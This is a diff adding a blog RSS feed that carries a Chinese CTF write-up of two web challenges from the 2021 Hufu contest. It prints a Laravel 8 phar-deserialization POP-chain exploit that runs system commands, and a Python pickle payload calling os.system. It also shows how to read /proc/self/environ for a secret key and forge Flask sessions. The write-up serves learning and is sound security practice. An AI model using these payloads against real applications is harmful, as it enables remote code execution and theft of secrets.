@@ -1,0 +1,177 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Laravel on Ca1s1&#39;Blog</title>
+    <link>https://vuln.top/tags/laravel/</link>
+    <description>Recent content in Laravel on Ca1s1&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 09 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://vuln.top/tags/laravel/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>2021年虎符线下赛WEB</title>
+      <link>https://vuln.top/posts/hufuctfweb/</link>
+      <pubDate>Sun, 09 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://vuln.top/posts/hufuctfweb/</guid>
+      <description>&lt;h2 id=&#34;tinypng&#34;&gt;tinypng&lt;/h2&gt;
+&lt;p&gt;题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png&#34; alt=&#34;&#34;&gt;
+首先查看路由信息
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;先查看一下&lt;code&gt;fileupload&lt;/code&gt;路由，可以发现文件上传时对内容进行了过滤，且只允许上传&lt;code&gt;png&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着我们看image路由，进入&lt;code&gt;ImageController&lt;/code&gt;，&lt;code&gt;$source&lt;/code&gt;可控接着判断是否为&lt;code&gt;png&lt;/code&gt;结尾，如果为&lt;code&gt;png&lt;/code&gt;结尾则传给&lt;code&gt;imgcompress&lt;/code&gt;类。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png&#34; alt=&#34;&#34;&gt;
+进入&lt;code&gt;imgcompress&lt;/code&gt;类，&lt;code&gt;$this-&amp;gt;src&lt;/code&gt;为我们传入的&lt;code&gt;$source&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png&#34; alt=&#34;&#34;&gt;
+接着又传递给&lt;code&gt;compressImg&lt;/code&gt;类，调用了&lt;code&gt;openImg&lt;/code&gt;方法
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;$source&lt;/code&gt;传递给了&lt;code&gt;getimagesize&lt;/code&gt;，&lt;code&gt;getimagesize&lt;/code&gt;可以触发&lt;code&gt;phar&lt;/code&gt;反序列化
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120612.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。
+从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-&lt;?php&#34; data-lang=&#34;&lt;?php&#34;&gt;namespace Illuminate\Broadcasting {
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct($events, $event) {
+            $this-&amp;gt;events = $events;
+            $this-&amp;gt;event = $event;
+        }
+    }
+
+    class BroadcastEvent {
+        public $connection;
+        public function __construct($connection) {
+            $this-&amp;gt;connection = $connection;
+        }
+    }
+}
+
+namespace Illuminate\Bus {
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct($queueResolver){
+            $this-&amp;gt;queueResolver = $queueResolver;
+        }
+    }
+}
+
+
+namespace {
+    $c = new Illuminate\Broadcasting\BroadcastEvent(&amp;#39;whoami&amp;#39;);
+    $b = new Illuminate\Bus\Dispatcher(&amp;#39;system&amp;#39;);
+    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
+    #print(urlencode(serialize($a)));
+    @unlink(&amp;#34;phar.phar&amp;#34;);
+    $phar=new Phar(&amp;#34;phar.phar&amp;#34;);
+    $phar-&amp;gt;startBuffering();
+    $phar-&amp;gt;setStub(&amp;#39;GIF89a&amp;#39;.&amp;#34;__HALT_COMPILER();&amp;#34;);
+    $phar-&amp;gt;setMetadata($a);
+    $phar-&amp;gt;addFromString(&amp;#34;test.txt&amp;#34;, &amp;#34;test&amp;#34;);
+    $phar-&amp;gt;stopBuffering();
+}
+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过如上exp生成&lt;code&gt;phar&lt;/code&gt;文件，使用&lt;code&gt;gzip&lt;/code&gt;打包修改为png后缀
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120640.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;tinypng&#34;&gt;tinypng&lt;/h2&gt;
+&lt;p&gt;题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png&#34; alt=&#34;&#34;&gt;
+首先查看路由信息
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;先查看一下&lt;code&gt;fileupload&lt;/code&gt;路由，可以发现文件上传时对内容进行了过滤，且只允许上传&lt;code&gt;png&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着我们看image路由，进入&lt;code&gt;ImageController&lt;/code&gt;，&lt;code&gt;$source&lt;/code&gt;可控接着判断是否为&lt;code&gt;png&lt;/code&gt;结尾，如果为&lt;code&gt;png&lt;/code&gt;结尾则传给&lt;code&gt;imgcompress&lt;/code&gt;类。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png&#34; alt=&#34;&#34;&gt;
+进入&lt;code&gt;imgcompress&lt;/code&gt;类，&lt;code&gt;$this-&amp;gt;src&lt;/code&gt;为我们传入的&lt;code&gt;$source&lt;/code&gt;
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png&#34; alt=&#34;&#34;&gt;
+接着又传递给&lt;code&gt;compressImg&lt;/code&gt;类，调用了&lt;code&gt;openImg&lt;/code&gt;方法
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;$source&lt;/code&gt;传递给了&lt;code&gt;getimagesize&lt;/code&gt;，&lt;code&gt;getimagesize&lt;/code&gt;可以触发&lt;code&gt;phar&lt;/code&gt;反序列化
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120612.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。
+从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-&lt;?php&#34; data-lang=&#34;&lt;?php&#34;&gt;namespace Illuminate\Broadcasting {
+    class PendingBroadcast {
+        protected $events;
+        protected $event;
+        public function __construct($events, $event) {
+            $this-&amp;gt;events = $events;
+            $this-&amp;gt;event = $event;
+        }
+    }
+
+    class BroadcastEvent {
+        public $connection;
+        public function __construct($connection) {
+            $this-&amp;gt;connection = $connection;
+        }
+    }
+}
+
+namespace Illuminate\Bus {
+    class Dispatcher {
+        protected $queueResolver;
+        public function __construct($queueResolver){
+            $this-&amp;gt;queueResolver = $queueResolver;
+        }
+    }
+}
+
+
+namespace {
+    $c = new Illuminate\Broadcasting\BroadcastEvent(&amp;#39;whoami&amp;#39;);
+    $b = new Illuminate\Bus\Dispatcher(&amp;#39;system&amp;#39;);
+    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);
+    #print(urlencode(serialize($a)));
+    @unlink(&amp;#34;phar.phar&amp;#34;);
+    $phar=new Phar(&amp;#34;phar.phar&amp;#34;);
+    $phar-&amp;gt;startBuffering();
+    $phar-&amp;gt;setStub(&amp;#39;GIF89a&amp;#39;.&amp;#34;__HALT_COMPILER();&amp;#34;);
+    $phar-&amp;gt;setMetadata($a);
+    $phar-&amp;gt;addFromString(&amp;#34;test.txt&amp;#34;, &amp;#34;test&amp;#34;);
+    $phar-&amp;gt;stopBuffering();
+}
+ 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过如上exp生成&lt;code&gt;phar&lt;/code&gt;文件，使用&lt;code&gt;gzip&lt;/code&gt;打包修改为png后缀
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120640.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;上传文件
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120729.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;访问&lt;code&gt;/image?image=phar://../storage/app/uploads/xx.png&lt;/code&gt;，成功代码执行
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120747.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;easyflask&#34;&gt;Easyflask&lt;/h2&gt;
+&lt;p&gt;根据页面提示访问&lt;code&gt;/file?file=/app/source&lt;/code&gt;可以获取到源代码
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120805.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;把代码复制到本地编辑器，便于分析。可以看到&lt;code&gt;file&lt;/code&gt;路由为文件读取，对后缀存在一定限制，但是也可以读取到部分文件。
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120823.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在代码头部发现SECRET_KEY存放在环境变量中
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120839.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们可以通过读取/proc/self/environ文件，获得SECRET_KEY
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120853.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着看admin路由存在pickle.loads，u参数可控那么就存在python反序列化漏洞（参考https://daolgts.github.io/2019/09/20/python%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/）
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120916.png&#34; alt=&#34;&#34;&gt;
+编写并运行EXP脚本，获得一串BASE64&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-import&#34; data-lang=&#34;import&#34;&gt;import pickle
+import os
+
+class User(object):
+    def __reduce__(self):
+        a = &amp;#34;`cat /flag &amp;gt;/tmp/1.txt `&amp;#34;
+        return (os.system,(a,))
+
+u = pickle.dumps(User())
+print(u)
+bu = base64.b64encode(u)
+print(bu)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着通过获取到的KEY，使用脚本伪造FLASK的Session（https://github.com/noraj/flask-session-cookie-manager）
+-s参数为SECRET_KEY，-t 参数为反序列化的内容
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121004.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;通过生成出的Session访问/admin路径，返回500为成功
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121023.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;接着进行文件读取获得flag
+&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121037.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
